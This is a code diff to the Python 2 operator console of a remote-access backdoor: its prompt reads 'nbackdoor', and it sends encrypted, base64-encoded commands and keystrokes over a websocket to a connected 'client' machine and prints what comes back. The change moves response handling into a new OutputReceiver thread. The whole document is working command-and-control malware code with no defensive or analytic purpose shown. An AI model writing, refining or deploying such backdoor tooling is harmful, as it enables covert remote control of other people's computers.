@@ -35,6 +35,7 @@ class ControllerClient:
         self.SECRET = os.urandom(32)
         self.ws = None
         self.to_client = None
+        self.is_cmd_running = False
 
         self.exit = False
         init(autoreset=True)
@@ -72,10 +73,7 @@ class ControllerClient:
                 # =======================
                 # ======= Command =======
                 # =======================
-                inputer = InputSender(self)
                 while not self.exit:
-                    inputer.stop = True
-
                     input_str = raw_input(Back.RED + 'nbackdoor' +
                                           ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                           ':' + Back.RESET + ' ')
@@ -86,34 +84,15 @@ class ControllerClient:
                     msg = json.dumps({'cmd': b64encode(input_str)})
                     self.ws.send_binary(self.encrypt(msg))
 
-                    inputer.stop = False
+                    self.is_cmd_running = True
+                    OutputReceiver(self)
 
-                    msg_recv = json.loads(self.decrypt(self.ws.recv()))
-                    if 'data' in msg_recv:
-                        while 'data' in msg_recv and 'end' not in msg_recv:
-                            data = get_data(msg_recv)
-                            print data
+                    while True:
+                        char = msvcrt.getch()
+                        if not self.is_cmd_running:
+                            break
 
-                            msg_recv = json.loads(self.decrypt(self.ws.recv()))
-
-                    elif 'char' in msg_recv:
-                        while 'char' in msg_recv and 'end' not in msg_recv:
-                            char = get_char(msg_recv)
-                            sys.stdout.write(char)
-                            sys.stdout.flush()
-
-                            msg_recv = json.loads(self.decrypt(self.ws.recv()))
-
-                    elif 'connected' in msg_recv:
-                        self.to_client = msg_recv['connected']
-                        print 'Connected to client ' + str(self.to_client) + '.\n'
-                    elif 'disconnected' in msg_recv:
-                        if msg_recv['disconnected'] == 'offline':
-                            self.to_client = None
-                            print 'Client Offline.\n'
-                        else:
-                            self.to_client = None
-                            print 'Disconnected success.\n'
+                        self.send_char(char)
 
                 self.ws.close()
 
@@ -138,25 +117,46 @@ class ControllerClient:
         self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char)})))
 
 
-class InputSender(threading.Thread):
+class OutputReceiver(threading.Thread):
     def __init__(self, client):
         threading.Thread.__init__(self)
 
         self.client = client
-        self.send_char = client.send_char
-        self.stop = True
+        self.ws = client.ws
+        self.decrypt = client.decrypt
 
-        self.exit = False
         self.daemon = True
         self.start()
 
     def run(self):
-        while not self.exit:
-            while self.stop:
-                time.sleep(0.1)
+        msg_recv = json.loads(self.decrypt(self.ws.recv()))
+        if 'data' in msg_recv:
+            while 'data' in msg_recv and 'end' not in msg_recv:
+                data = get_data(msg_recv)
+                print data
 
-            char = msvcrt.getch()       #todo !!!!!!!!!!!!!!!!!!!!!!!!!!!!
-            self.send_char(char)
+                msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
+        elif 'char' in msg_recv:
+            while 'char' in msg_recv and 'end' not in msg_recv:
+                char = get_char(msg_recv)
+                sys.stdout.write(char)
+                sys.stdout.flush()
+
+                msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
+        elif 'connected' in msg_recv:
+            self.client.to_client = msg_recv['connected']
+            print 'Connected to client ' + str(self.client.to_client) + '.\n'
+        elif 'disconnected' in msg_recv:
+            if msg_recv['disconnected'] == 'offline':
+                self.client.to_client = None
+                print 'Client Offline.\n'
+            else:
+                self.client.to_client = None
+                print 'Disconnected success.\n'
+
+        self.client.is_cmd_running = False
 
 
 def hostname():
